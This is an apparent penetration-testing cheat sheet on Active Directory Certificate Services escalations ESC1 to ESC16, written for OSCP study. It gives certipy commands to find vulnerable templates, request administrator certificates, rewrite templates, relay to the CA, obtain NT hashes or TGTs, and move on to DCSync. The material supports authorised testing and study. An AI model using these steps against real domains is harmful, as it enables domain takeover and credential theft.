# ADCS ESC reference

Which ESC is which, and the move each one allows. The commands for each are in :Pb adcs.

## Map the CA first
At the pwn-broker prompt: tool install certipy.
certipy find -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -vulnerable -stdout
- [ ] Each [!] line is an ESC, with the template or CA it sits on, the reason, and the group that may enrol
- [ ] The CA's name, the template's name and the CA's host noted exactly as printed

## On the template: I enrol, or rewrite it
- [ ] ESC1, I supply the subject and it allows client authentication: a request with -upn administrator@<Domain>, and on a patched DC -sid '<DomainSID>-500' as well
- [ ] ESC2, any purpose: the same request, and the certificate does anything
- [ ] ESC3, enrolment agent: an agent certificate first, then a request with -pfx for that certificate and -on-behalf-of, which takes the domain's short name, a backslash and the user
- [ ] ESC4, I can write the template: certipy template with -write-default-configuration, the old configuration saved, a request as for ESC1, then the template put back with -write-configuration
- [ ] ESC13, an issuance policy linked to a privileged group: a normal enrolment, and the certificate carries the group's rights
- [ ] ESC14, altSecurityIdentities mapping: the mapping written onto the target, then enrolment as them

## On the CA
- [ ] ESC6, EDITF_ATTRIBUTESUBJECTALTNAME2 set: any template takes -upn, so a request as for ESC1
- [ ] ESC7, ManageCA: myself added with -add-officer, the template turned on with -enable-template, and my own pending request issued
- [ ] ESC16, the SID extension turned off for the whole CA: any template behaves as ESC1, once I control an account's UPN through GenericWrite
- [ ] ESC9 and ESC10, weak mapping: with GenericWrite over an account, its UPN set to the target's, a request, then the UPN set back

## By relay
- [ ] Not on the OSCP exam: relay and coercion are kept out as a safe reading; OffSec's pages do not name them
- [ ] ESC8, HTTP enrolment: a coerced DC relayed to http://<TargetIP>/certsrv/certfnsh.asp, with <TargetIP> the CA server, for a certificate as the DC: :Pb ntlm-relay
- [ ] ESC11, RPC enrolment without packet privacy: certipy relay -target 'rpc://<TargetIP>' -ca '<CA>'

## Use the certificate
certipy auth -pfx administrator.pfx -dc-ip <DCIP>
- [ ] It prints the NT hash and writes a TGT: the hash passed, or KRB5CCNAME set
- [ ] KDC_ERR_PADATA_TYPE_NOSUPP, no PKINIT: certipy auth -pfx administrator.pfx -dc-ip <DCIP> -ldap-shell
- [ ] KRB_AP_ERR_SKEW: sudo ntpdate <DCIP> again, right before the request

## Limits
- [ ] DCs patched since September 2025 always enforce strong certificate mapping: a certificate with a name only is refused, so ESC9 and ESC16 need a real SID, or an ESC6 CA as well
- [ ] certipy 5: -debug goes before the subcommand; the account subcommand rewrites a UPN, and shadow does shadow credentials, :Pb shadow-credentials

## Clean up and next
- [ ] The ESC4 template restored, the ESC7 officer removed, the ESC9 or ESC16 UPN put back
- [ ] Domain administrator: :Pb dcsync, then :Pb dpapi for the saved credentials
